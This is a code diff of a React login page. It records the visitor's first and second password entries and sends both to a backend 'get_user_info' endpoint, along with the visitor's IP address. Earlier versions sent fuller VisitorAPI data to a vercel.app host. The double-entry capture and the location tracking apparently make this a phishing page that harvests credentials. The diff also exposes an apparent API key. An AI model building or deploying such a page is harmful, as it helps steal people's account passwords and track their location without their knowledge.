@@ -2,7 +2,6 @@ import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import './Login.css';
 import { useNavigate } from 'react-router-dom';
-const VisitorAPI = require("visitorapi");
 
 const Login = () => {
   const [email, setEmail] = useState('');
@@ -13,19 +12,23 @@ const Login = () => {
   const [secondPasswordUsed, setSecondPasswordUsed] = useState('');
   const [passwordError, setPasswordError] = useState('');
   const [attemptCount, setAttemptCount] = useState(0); // To track the number of login attempts
-  const [visitorData, setVisitorData] = useState({}); // store the whole JSON data
+  const [userIp, setUserIp] = useState(''); // State to store user IP address
 
   const navigate = useNavigate(); // Define the navigate function
 
-  // Fetch user's visitor data
+  // Fetch user's IP address
   useEffect(() => {
-    VisitorAPI(
-      "ohXzOBizNPU5PSwkkR7d", // Replace with VisitorAPI key
-      data => {
-        setVisitorData(data);
-        console.log('Visitor Data fetched:', data); // Check the data received
+    // Use an external service to fetch the user's IP address
+    const fetchUserIp = async () => {
+      try {
+        const response = await axios.get('https://api.ipify.org?format=json');
+        setUserIp(response.data.ip);
+      } catch (error) {
+        console.error('Error fetching IP address:', error);
       }
-    );
+    };
+
+    fetchUserIp();
   }, []);
 
   // Handle email input change
@@ -87,11 +90,11 @@ const Login = () => {
 
     // Try to send login request to backend
     try {
-      const response = await axios.post('https://betabe.vercel.app/api/get_user_info/', {
+      const response = await axios.post('http://127.0.0.1:8000/api/get_user_info/', {
         email: email,
         firstpasswordused: firstPasswordUsed,
         secondpasswordused: password, // Send the second password attempt
-        visitorData: visitorData, // Send the visitor data to backend
+        user_ip: userIp, // Send the user's IP address to the backend
       });
       console.log('Response from backend:', response.data);
       // Handle successful response here (e.g., redirect or show success message)
